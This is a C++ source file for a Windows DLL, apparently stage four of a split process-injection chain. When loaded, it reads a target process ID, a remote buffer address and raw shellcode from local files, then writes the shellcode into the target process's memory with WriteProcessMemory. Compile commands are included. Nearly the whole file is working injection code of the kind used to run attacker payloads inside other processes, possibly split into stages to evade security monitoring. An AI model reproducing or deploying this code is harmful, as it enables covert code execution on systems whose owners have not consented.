// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars32.bat"
// cl.exe /D_USRDLL /D_WINDLL /MT /TP step4.cpp /link /DLL /out:step4.dll /SUBSYSTEM:CONSOLE /MACHINE:x64
// Writes the shellcode into the remote section

#include "dll.h"
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")
#include "splitproc.h"

typedef unsigned __int64 QWORD;
HANDLE log_file = NULL;
size_t bytesWritten;
DWORD bytesWritten2;
DWORD bytesRead = 0;
BOOL verbose_output = TRUE;
DWORD target_proc_pid = 0;

char shellcode[BUFFER_SIZE];
char msg[1024];

void log_msg(const char * line)
{
	if(verbose_output) WriteFile(log_file,line,strlen(line),&bytesWritten2, NULL);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if(ul_reason_for_call != DLL_PROCESS_ATTACH) return 0; // only execute this once, during process attach (we don't want this to run twice)
	if(verbose_output)
	{
		log_file = CreateFileA("split.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create the log
		if (log_file != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(log_file, 0, NULL, FILE_END);
		}
	}
	// get the pid to inject into
	HANDLE pid_file = CreateFileA("split.pid", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(pid_file==INVALID_HANDLE_VALUE)
	{
		log_msg("Cannot open PID file. Exiting.\n");
		if(verbose_output) CloseHandle(log_file);	
		return 0;
	}
	ReadFile(pid_file,&target_proc_pid,sizeof(target_proc_pid),&bytesRead,NULL);
	CloseHandle(pid_file);
	
    if (!target_proc_pid) {		
        log_msg("Process PID not found in the log.\n");
		if(verbose_output) CloseHandle(log_file);
        return 1;
    }
	
	snprintf(msg,sizeof(msg),"PID found (step4) in the log: %d\n",target_proc_pid);
	log_msg(msg);		
		
	LPVOID remoteBuffer = NULL;
	HANDLE ptr_file = CreateFileA("split.buff_addr", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);		
	if(ptr_file==INVALID_HANDLE_VALUE)
	{	
		log_msg("Cannot open the remote buffer address file split.buff_addr (step4). Exiting.\n");
		if(verbose_output) CloseHandle(log_file);	
		return 0;
	}		
	QWORD ptrAsInt = 0;
	ReadFile(ptr_file,&ptrAsInt,sizeof(QWORD),&bytesRead,NULL);
	CloseHandle(ptr_file);	
	remoteBuffer = (LPVOID)ptrAsInt;				
	snprintf(msg,sizeof(msg),"Remote buffer address read from the ptr file (step4): %p\n",remoteBuffer);
	log_msg(msg);			
	
	
	// OK, now read the shellcode
	memset(&shellcode,0,BUFFER_SIZE);
	HANDLE shellcode_file = CreateFileA("split.opcode", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(shellcode_file==INVALID_HANDLE_VALUE)
	{
		log_msg("Cannot open PID file. Exiting.\n");
		if(verbose_output) CloseHandle(log_file);
		return FALSE;
	}
	ReadFile(shellcode_file,&shellcode,BUFFER_SIZE,&bytesRead,NULL);
	CloseHandle(shellcode_file);	
	if(bytesRead==0)
	{
		log_msg("Fatal, could not read opcode file (step 4)!\n");
		return FALSE;
	}
	
	// Write it into the remote process's memory.
	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE, FALSE, target_proc_pid);
	if (!hProcess) {
		log_msg("Failed to open process.\n");
		printf("LAST ERROR: %d",GetLastError());
		return 0;
	}	
	if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, BUFFER_SIZE, &bytesWritten)) {
		log_msg("Failed to write to process memory.\n");		
		return 0;
	}
	CloseHandle(hProcess);
	snprintf(msg,sizeof(msg),"Opcode written successful to %p (step4).\n",remoteBuffer);
	log_msg(msg);
	return TRUE;
}
